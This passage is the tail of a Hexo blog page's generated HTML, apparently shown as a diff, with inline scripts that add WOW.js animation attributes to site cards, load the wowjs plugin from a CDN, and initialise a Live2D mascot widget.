+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('site-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__animated');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script></div><script defer src="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/wow_init.js"></script><!-- hexo injector body_end end --><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body></html>
